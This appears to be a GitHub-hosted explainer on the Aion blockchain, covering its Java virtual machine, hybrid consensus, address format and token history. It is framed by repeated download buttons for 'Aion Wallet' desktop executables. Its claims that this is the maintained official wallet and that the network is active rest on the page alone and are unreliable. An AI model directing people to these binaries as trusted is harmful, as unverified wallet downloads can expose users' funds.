![Aion Wallet](assets/banner-article.png)

# What is Aion: the network in plain terms

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Aion is a blockchain network with its own token, AION, whose main distinguishing feature is a virtual machine that runs smart contracts written in Java.

It launched in 2017, operates a mainnet with chain ID 256, and secures itself with Unity consensus, which alternates proof-of-work and proof-of-stake blocks. Its stated purpose is interoperability: connecting separate chains rather than replacing them.

## You'll see this if

- You are new to the network and want the short version.
- You found the token on an exchange and want to know what it belongs to.
- You are comparing it with an EVM chain and wondering why the addresses look different.
- You are reading older material that calls it something else.

## The three things that define it

A virtual machine. Contracts run on the Aion Virtual Machine, which executes Java bytecode with deterministic restrictions. That choice is unusual: most chains run the EVM and expect Solidity, while Aion expects Java tooling and a JVM mindset.

A hybrid consensus. Unity alternates between proof-of-work and proof-of-stake blocks. Miners produce every other block and stakers produce the rest, which means two different groups earn from the same chain.

An interoperability thesis. The network was designed around connecting chains, and an early production bridge moved ERC-20 AION on Ethereum to native AION on mainnet. That bridge's swap window has since closed, but the architecture it demonstrated is still the project's stated direction.

## The token

AION is the network's native asset. It pays fees, it is the thing miners and stakers earn, and it is what a pool or a solo staker bonds to register.

An older ERC-20 form existed on Ethereum for the original token sale. The two are not interchangeable today: the swap that converted one to the other closed in January 2022, and the [Aion ERC-20 or mainnet](https://github.com/aion-wallet/aion-explained/blob/main/aion-erc-20-or-mainnet.md) article explains the difference.

## Addresses and identifiers

Accounts are 32-byte values rendered as `0x` plus `a0` plus 62 hexadecimal characters, 66 characters in total. There is no capitalisation checksum, and the format is not the same as an Ethereum address.

Chain ID 256 is the identifier tools use to confirm they are talking to mainnet. The [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) guide covers where those identifiers are used.

## Where the wallet fits

Aion Wallet is the desktop client: non-custodial, local keys, Windows, macOS and Linux, with sending, receiving, delegation and bridging in one application. It is the practical way to hold the token described above.

The [Aion Wallet explained](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-explained.md) article covers what it does with keys, and the release page carries the current build.

## What Aion is not

It is not an EVM chain, so Ethereum tooling does not work against it without adaptation. It is not a fork of Ethereum, despite sharing some design vocabulary. It is not related to the video game that shares its name, which the [Aion 2 game confusion](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-2-game-confusion.md) article addresses.

It is also not a company in the ordinary sense. The network was developed by a team and later stewarded by a foundation, and the code is open source.

## Prevention

For anything involving funds, confirm the chain before you send: chain ID 256, an `0xa0` address, and a wallet that names Aion explicitly.

Read the history before drawing conclusions from an old guide. The project renamed its public-facing network once and closed a token swap, and older articles predate both.

Keep the wallet updated so its view of the network matches the current one.

## How it compares with an EVM chain

On an EVM chain, a contract is Solidity compiled to EVM bytecode, addresses are 42 characters, and the tooling ecosystem assumes both. Aion inverts the first and changes the second, which is why an Ethereum tutorial is a poor starting point here.

The practical differences are the ones that cost time. Contract code is Java, so the compiler and the testing habits are Java ones. Addresses are 66 characters, so any validation written for Ethereum rejects a correct Aion address. Chain ID 256 identifies the network, and the native coin is the only asset the chain itself knows about.

What carries over is the mental model: an account, a balance, a signed transaction and a fee. A developer who understands that much can move between the two families of chain without relearning the concepts, only the tooling, as the [Aion Java smart contract](https://github.com/aion-wallet/aion-explained/blob/main/aion-java-smart-contract.md) guide sets out.

## Frequently asked questions

### Who created Aion?

The project was founded in Toronto by Matthew Spoke and co-founders and launched in 2017, with mainnet following in 2018.

### What is AION used for?

Fees, block rewards for miners and stakers, and the bond required to register as a pool or solo staker.

### Is Aion EVM compatible?

No. It runs the AVM, which executes Java bytecode rather than EVM bytecode.

### Does Aion still exist?

Yes. The network operates, the node repository publishes releases, and the desktop wallet is maintained on this account. The [is Aion still active](https://github.com/aion-wallet/aion-explained/blob/main/is-aion-still-active.md) article sets out what can be checked.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion vs the OAN](https://github.com/aion-wallet/aion-explained/blob/main/aion-vs-the-oan.md) - the rename, and what it changed.
- [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) - the identifiers that matter.
- [What happened to Aion](https://github.com/aion-wallet/aion-explained/blob/main/what-happened-to-aion.md) - the short history.
- [Aion Java smart contract](https://github.com/aion-wallet/aion-explained/blob/main/aion-java-smart-contract.md) - what the virtual machine runs.
